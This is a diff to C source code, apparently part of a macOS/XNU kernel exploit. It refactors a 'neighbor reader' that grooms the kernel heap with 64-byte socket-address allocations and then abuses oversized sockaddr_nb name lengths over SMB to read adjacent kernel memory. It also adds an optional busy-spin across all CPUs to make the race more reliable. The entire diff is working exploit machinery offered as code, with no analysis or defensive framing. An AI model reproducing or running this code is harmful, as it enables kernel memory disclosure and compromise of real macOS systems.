@@ -23,6 +23,7 @@
 
 #include "zkext_neighbor_reader.h"
 #include "kmem_neighbor_reader.h"
+#include "allocator_nrnw.h"
 #include "macos_params.h"
 
 #include "../xnu/saddr_allocator.h"
@@ -32,42 +33,32 @@
 
 #define NUM_SAMPLES_FOR_PROBABILITY 100
 #define CUTOFF_PROBABILITY 0.95
+#define NUM_KEXT_64_PAD_START_PAGES 16
+#define NUM_KEXT_64_ELEMENTS_PER_GAP 7
+#define NUM_KEXT_64_READ_SLOTS (XE_PAGE_SIZE / 64 * 64)
+#define NUM_KEXT_64_FRAGMENTED_PAGES 64
+#define NUM_KEXT_64_PAD_END_PAGES 8
+
+#define KMEM_ZKEXT_NB_ENABLE_CPU_DOS TRUE
 
 
-struct kmem_zkext_neighbor_reader {
-    xnu_saddr_allocator_t pad_start_allocator;
-    xnu_saddr_allocator_t reader_allocator;
-    xnu_saddr_allocator_t pad_end_allocator;
+kmem_allocator_nrnw_t kmem_zkext_neighbor_reader_prepare(const struct sockaddr_in* smb_addr) {
+    kmem_allocator_nrnw_t gap_allocator = kmem_allocator_nrnw_create(smb_addr);
+    kmem_allocator_nrnw_t element_allocator = kmem_allocator_nrnw_create(smb_addr);
     
-    enum {
-        STATE_CREATED,
-        STATE_USED,
-    } state;
+    kmem_allocator_nrnw_allocate(element_allocator, 64, NUM_KEXT_64_PAD_START_PAGES * XE_PAGE_SIZE / 64);
+    for (int i=0; i<NUM_KEXT_64_READ_SLOTS; i++) {
+        kmem_allocator_nrnw_allocate(gap_allocator, 64, 1);
+        kmem_allocator_nrnw_allocate(element_allocator, 64, NUM_KEXT_64_ELEMENTS_PER_GAP);
+    }
+    kmem_allocator_nrnw_allocate(element_allocator, 64, NUM_KEXT_64_PAD_END_PAGES * XE_PAGE_SIZE / 64);
     
-    struct sockaddr_in smb_addr;
-};
-
-void kmem_neighbor_reader_init_saddr_allocators(kmem_zkext_neighour_reader_t reader) {
-    xe_assert(reader->pad_start_allocator == NULL);
-    xe_assert(reader->reader_allocator == NULL);
-    xe_assert(reader->pad_end_allocator == NULL);
-    reader->pad_start_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 4);
-    reader->reader_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 28);
-    reader->pad_end_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 4);
+    kmem_allocator_nrnw_destroy(&gap_allocator);
+    return element_allocator;
 }
 
-kmem_zkext_neighour_reader_t kmem_zkext_neighbor_reader_create(const struct sockaddr_in* smb_addr) {
-    kmem_zkext_neighour_reader_t reader = malloc(sizeof(struct kmem_zkext_neighbor_reader));
-    bzero(reader, sizeof(struct kmem_zkext_neighbor_reader));
-    
-    reader->smb_addr = *smb_addr;
-    kmem_neighbor_reader_init_saddr_allocators(reader);
-    
-    reader->state = STATE_CREATED;
-    return reader;
-}
 
-double kmem_zkext_neighbor_reader_check(kmem_zkext_neighour_reader_t reader, uint8_t zone_size, uint8_t addr_len) {
+double kmem_zkext_neighbor_reader_check(const struct sockaddr_in* smb_addr, uint8_t zone_size, uint8_t addr_len) {
     int num_overwritten = ((int)addr_len - 1) / 64;
     int total_size = (num_overwritten + 1) * 64;
     uint8_t to_read = total_size - offsetof(struct sockaddr_nb, snb_name) - 6;
@@ -83,7 +74,7 @@ double kmem_zkext_neighbor_reader_check(kmem_zkext_neighour_reader_t reader, uin
         
         dispatch_async(xe_dispatch_queue(), ^() {
             struct kmem_neighbor_reader_args params;
-            params.smb_addr = reader->smb_addr;
+            params.smb_addr = *smb_addr;
             params.saddr_snb_len = sizeof(struct sockaddr_nb);
             params.saddr_ioc_len = sizeof(struct sockaddr_nb);
             params.saddr_snb_name_seglen = 3;
@@ -110,9 +101,9 @@ double kmem_zkext_neighbor_reader_check(kmem_zkext_neighour_reader_t reader, uin
         
         _Bool is_hit = TRUE;
         for (int i=0; i<num_overwritten; i++) {
-            struct sockaddr_un un;
-            memcpy(&un, &local_nb_name[bytes_to_skip + i * 64], sizeof(struct sockaddr_un));
-            if (un.sun_len != 64 || un.sun_family != AF_LOCAL) {
+            struct sockaddr_in in;
+            memcpy(&in, &local_nb_name[bytes_to_skip + i * 64], sizeof(struct sockaddr_in));
+            if (in.sin_len != 64 || in.sin_family != AF_INET) {
                 is_hit = FALSE;
                 break;
             }
@@ -127,20 +118,16 @@ double kmem_zkext_neighbor_reader_check(kmem_zkext_neighour_reader_t reader, uin
     return (double)num_hits / (double)NUM_SAMPLES_FOR_PROBABILITY;
 }
 
-int kmem_zkext_neighbor_reader_read_internal(kmem_zkext_neighour_reader_t reader, uint8_t zone_size, char* data, size_t data_size) {
+int kmem_zkext_neighbor_reader_read_internal(const struct sockaddr_in* smb_addr, uint8_t zone_size, char* data, size_t data_size) {
     xe_assert_cond(data_size, <=, zone_size);
-    xe_assert_cond(reader->state, ==, STATE_CREATED);
 //    xe_assert_cond(zone_size, >=, 64);
     xe_assert_cond(zone_size, <, 128);
     
-    reader->state = STATE_USED;
-    xnu_saddr_allocator_allocate(reader->pad_start_allocator);
-    xnu_saddr_allocator_allocate(reader->reader_allocator);
-    xnu_saddr_allocator_fragment(reader->reader_allocator, 8);
-    xnu_saddr_allocator_allocate(reader->pad_end_allocator);
+    kmem_allocator_nrnw_t element_allocator = kmem_zkext_neighbor_reader_prepare(smb_addr);
     
+    int error = EAGAIN;
     for (int i=0; i<MAX_TRIES; i++) {
-        double probability = kmem_zkext_neighbor_reader_check(reader, zone_size, zone_size * 2);
+        double probability = kmem_zkext_neighbor_reader_check(smb_addr, zone_size, zone_size * 2);
         if (probability < CUTOFF_PROBABILITY) {
             xe_log_debug("skipping read due to low success probability of %.2f", probability);
             continue;
@@ -152,7 +139,7 @@ int kmem_zkext_neighbor_reader_read_internal(kmem_zkext_neighour_reader_t reader
         uint8_t snb_name_seglen = zone_size + zone_size - offsetof(struct sockaddr_nb, snb_name) + 2;
         
         struct kmem_neighbor_reader_args params;
-        params.smb_addr = reader->smb_addr;
+        params.smb_addr = *smb_addr;
         params.saddr_snb_len = sizeof(struct sockaddr_nb);
         params.saddr_ioc_len = sizeof(struct sockaddr_nb);
         params.saddr_snb_name_seglen = 3;
@@ -172,49 +159,35 @@ int kmem_zkext_neighbor_reader_read_internal(kmem_zkext_neighour_reader_t reader
         memcpy(data, &local_nb_name[bytes_to_skip], data_size);
         
         free(local_nb_name);
-        goto done;
+        error = 0;
+        break;
     }
     
-    return EAGAIN;
-    
-done:
-    return 0;
+    kmem_allocator_nrnw_destroy(&element_allocator);
+    return error;
 }
 
-int kmem_zkext_neighbor_reader_read(kmem_zkext_neighour_reader_t reader, uint8_t zone_size, char* data, size_t data_size) {
+int kmem_zkext_neighbor_reader_read(const struct sockaddr_in* smb_addr, uint8_t zone_size, char* data, size_t data_size) {
+#if defined(KMEM_ZKEXT_NB_ENABLE_CPU_DOS)
     dispatch_queue_t queue = dispatch_queue_create("reader", dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_CONCURRENT, QOS_CLASS_USER_INTERACTIVE, DISPATCH_QUEUE_PRIORITY_HIGH));
-    
+
     volatile _Bool* stop = alloca(sizeof(_Bool));
     *stop = FALSE;
     int* res = alloca(sizeof(int));
     dispatch_apply(xe_cpu_count(), queue, ^(size_t index) {
         if (index == 0) {
             xe_sleep_ms(10);
-            *res = kmem_zkext_neighbor_reader_read_internal(reader, zone_size, data, data_size);
+            *res = kmem_zkext_neighbor_reader_read_internal(smb_addr, zone_size, data, data_size);
             *stop = TRUE;
         } else {
             while (!*stop) {}
         }
     });
-    
+
     dispatch_release(queue);
     return *res;
+#else
+    return kmem_zkext_neighbor_reader_read_internal(smb_addr, zone_size, data, data_size);
+#endif
 }
 
-void kmem_zkext_neighbor_reader_reset(kmem_zkext_neighour_reader_t reader) {
-    xe_assert(reader->state == STATE_USED);
-    xnu_saddr_allocator_destroy(&reader->pad_start_allocator);
-    xnu_saddr_allocator_destroy(&reader->reader_allocator);
-    xnu_saddr_allocator_destroy(&reader->pad_end_allocator);
-    kmem_neighbor_reader_init_saddr_allocators(reader);
-    reader->state = STATE_CREATED;
-}
-
-void kmem_zkext_neighbor_reader_destroy(kmem_zkext_neighour_reader_t* reader_p) {
-    kmem_zkext_neighour_reader_t reader = *reader_p;
-    xnu_saddr_allocator_destroy(&reader->pad_start_allocator);
-    xnu_saddr_allocator_destroy(&reader->reader_allocator);
-    xnu_saddr_allocator_destroy(&reader->pad_end_allocator);
-    free(reader);
-    *reader_p = NULL;
-}
